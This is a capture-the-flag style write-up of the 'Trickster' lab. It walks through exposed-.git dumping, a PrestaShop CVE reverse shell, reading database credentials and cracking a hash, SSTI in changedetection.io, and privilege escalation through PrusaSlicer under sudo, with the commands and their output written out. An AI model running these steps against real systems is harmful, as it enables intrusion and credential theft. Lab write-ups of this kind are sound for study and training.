## Trickster

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, Database Enumeration, Hash Decryption, SSTI, Docker Exploit, PrusaSlicer, Priv Esc, Linux

#### Enumeration
- run nmap
- two ports open `80 and 22`
- use `feroxbuster` to enumerate endpoint
- visiting the application on port 80 we can find the domain and subdomain name `trickster.htb & shop.trickster.htb`
![[feroxbuster scan.png]]
- we find `.git` in the subdomain `shop.trickster.htb`
- use `git-dumper` to download the `.git` directory from remote
```bash
$ git-dumper http://shop.trickster.htb shop
$ ls ~/shop
admin634ewutrx1jgitlooaj  autoload.php  error500.html  index.php  init.php  Install_PrestaShop.html  INSTALL.txt  LICENSES  Makefile
```
- search admin URL for `prestashop` and we find that the admin URL is a randomized string with prefix admin which match with the directory name `admin634ewutrx1jgitlooaj` append that to the end of the domain name `shop.trickster.htb`
- we get a login page for admin which also tells us the version number of the application
- search for `prestashop 8.1.5 POC` found this post (https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/)
- we can use the POC to get reverse shell to target
![[admin panel.png]]
#### Initial Foothold 
- executing the POC we get access to target as `www-data`
![[initial foothold.png]]
#### Lateral Movement (If any)
- search online `prestashop database connection file`, returned `app/config/parameters.php`
- check for `parameters.php` we get user database user credential 
```bash
www-data@trickster:~/prestashop/app/config$ cat parameters.php
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
    'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
    'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47',
    'api_public_key' => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
Scu6QqRAdotokqW2m3aMt+LV8ERdFsBkj+/OVdJ8oslvSt6Kgf39DnBpGIXAqaFc
QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
ZQIDAQAB
-----END PUBLIC KEY-----
',
    'api_private_key' => '-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
/C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
Geq6MswRO6OXfLs4Rzuw17S9nQ0PDi4OqsG6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
+Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
6SMIa53I2hJz4IMK4vc2Ssqq
-----END PRIVATE KEY-----
',
  ),
);
```
- login to the database and enumerate
```bash
www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -pprest@shop_o prestashop
```
- found table that contains user credentials 
```sql
MariaDB [prestashop]> select * from ps_employee \G;
*************************** 1. row ***************************
             id_employee: 1
              id_profile: 1
                 id_lang: 1
                lastname: Store
               firstname: Trickster
                   email: admin@trickster.htb
                  passwd: $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C
         last_passwd_gen: 2024-05-25 13:10:20
         stats_date_from: 2024-04-25
           stats_date_to: 2024-05-25
      stats_compare_from: 0000-00-00
        stats_compare_to: 0000-00-00
    stats_compare_option: 1
    preselect_date_range: 
                bo_color: 
                bo_theme: default
                  bo_css: theme.css
             default_tab: 1
                bo_width: 0
                 bo_menu: 1
                  active: 1
                   optin: NULL
           id_last_order: 5
id_last_customer_message: 0
        id_last_customer: 0
    last_connection_date: 2025-09-13
    reset_password_token: 48ae1c53f436add3ccbcd22c6690a99723fc2968
 reset_password_validity: 2025-09-14 17:45:58
    has_enabled_gravatar: 0
*************************** 2. row ***************************
             id_employee: 2
              id_profile: 2
                 id_lang: 0
                lastname: james
               firstname: james
                   email: james@trickster.htb
                  passwd: $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm
         last_passwd_gen: 2024-09-09 13:22:42
         stats_date_from: NULL
           stats_date_to: NULL
      stats_compare_from: NULL
        stats_compare_to: NULL
    stats_compare_option: 1
    preselect_date_range: NULL
                bo_color: NULL
                bo_theme: NULL
                  bo_css: NULL
             default_tab: 0
                bo_width: 0
                 bo_menu: 1
                  active: 0
                   optin: NULL
           id_last_order: 0
id_last_customer_message: 0
        id_last_customer: 0
    last_connection_date: NULL
    reset_password_token: NULL
 reset_password_validity: NULL
    has_enabled_gravatar: 0
2 rows in set (0.001 sec)


```
- use `john` to decrypt the hash
```bash
$ john james -w=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alwaysandforever (?)     
1g 0:00:00:03 DONE (2025-09-13 15:20) 0.3267g/s 12105p/s 12105c/s 12105C/s bandit2..alkaline
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
- we login to target via `ssh`
- once logged in, load and execute `linpeas.sh` 
- target is running docker as per below from scan output, shows the docker processes running
```bash
root        1261  0.3  1.1 1800788 46680 ?       Ssl  21:31   0:11 /usr/bin/containerd

root        1365  0.0  1.9 1977936 77136 ?       Ssl  21:31   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

root       48912  0.0  0.2 1238400 11708 ?       Sl   22:20   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id a4b9a36ae7ffc48c2b451ead77f93a8572869906f386773c3de528ca950295cd -address /run/containerd/containerd.sock
root       48960  0.4  1.8 1300332 74072 ?       Ssl  22:20   0:01  _ python ./changedetection.py -d /datastore
```
- check the `ip address` of the docker container 
```
$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:18:af brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.129.4.135/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3514sec preferred_lft 3514sec
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:30:65:c5:9e brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
5: veth00e5fed@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 36:ea:fa:0e:2c:b7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
```
- load nmap binary to the target and scan internal open ports 
```bash
james@trickster:~$ ./nmap -p- -T4 --min-rate 1000 127.17.0.0/24 -vv
Starting Nmap 7.91 ( https://nmap.org ) at 2025-09-13 23:09 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Initiating Ping Scan at 23:09
Scanning 256 hosts [2 ports/host]
Completed Ping Scan at 23:09, 0.04s elapsed (256 total hosts)
Initiating Parallel DNS resolution of 256 hosts. at 23:09
Completed Parallel DNS resolution of 256 hosts. at 23:09, 0.02s elapsed
Initiating Connect Scan at 23:09
Scanning 8 hosts [65535 ports/host]
Discovered open port 22/tcp on 127.17.0.0
Discovered open port 22/tcp on 127.17.0.1
Discovered open port 22/tcp on 127.17.0.2
Discovered open port 22/tcp on 127.17.0.3
Discovered open port 22/tcp on 127.17.0.4
Discovered open port 22/tcp on 127.17.0.5
Discovered open port 22/tcp on 127.17.0.6
Discovered open port 22/tcp on 127.17.0.7
Discovered open port 80/tcp on 127.17.0.0
Discovered open port 80/tcp on 127.17.0.1
Discovered open port 80/tcp on 127.17.0.2
Discovered open port 80/tcp on 127.17.0.3
Discovered open port 80/tcp on 127.17.0.4
Discovered open port 80/tcp on 127.17.0.5
Discovered open port 80/tcp on 127.17.0.6
Discovered open port 80/tcp on 127.17.0.7
Discovered open port 5000/tcp on 127.17.0.2
```
- we get port 5000 on `127.17.0.2`
- port forward using `ssh`
```
$ ssh james@trickster.htb -L 5001:172.17.0.2:5000
james@trickster.htb's password: 
Last login: Sat Sep 13 23:10:55 2025 from 10.10.14.2
```
- access the app running on port 5000 we get `changedetection.io` running version `0.45.20`
- search online found (https://www.exploit-db.com/exploits/52027)
- run the script however nothing returned 
- attempted to exploit the `SSTI` vulnerability manually, able to get a shell as root user on the docker container
![[Medium/Unix/Trickster/ssti.png]]
- checking the backup folder and found user `adam`'s credential
![[backup zip.png]]
- Note: the text file within the backup is compressed with `brotli`, decompress with `brotli --decompress your_file.txt.br` to get the text file
```txt
  This website requires JavaScript.
    Explore Help
    Register Sign In
                james/prestashop
              Watch 1
              Star 0
              Fork 0
                You've already forked prestashop
          Code Issues Pull Requests Actions Packages Projects Releases Wiki Activity
                main
          prestashop / app / config / parameters.php
            james 8ee5eaf0bb prestashop
            2024-08-30 20:35:25 +01:00

              64 lines
              3.1 KiB
              PHP

            Raw Permalink Blame History

                < ? php return array (                                                                                                                                 
                'parameters' =>                                                                                                                                        
                array (                                                                                                                                                
                'database_host' => '127.0.0.1' ,                                                                                                                       
                'database_port' => '' ,                                                                                                                                
                'database_name' => 'prestashop' ,                                                                                                                      
                'database_user' => 'adam' ,                                                                                                                            
                'database_password' => 'adam_admin992' ,                          <snip>
```
#### Privilege Escalation
- ssh into target with user `adam`
- run `sudo -l`
- found that `adam` is able to run `prusaslicer` as root without password
![[sudo -l.png]]
- search for `/opt/PrusaSlicer/prusaslicer priv esc` found POC (https://github.com/suce0155/prusaslicer_exploit)
- load the script and `3mf` file to the target and modify the attacker `ip & port`
- run the command with `sudo` and we get root reverse-shell 
![[priv esc.png]]
![[root acccess.png]]
#### Resources

#### Lesson Learned
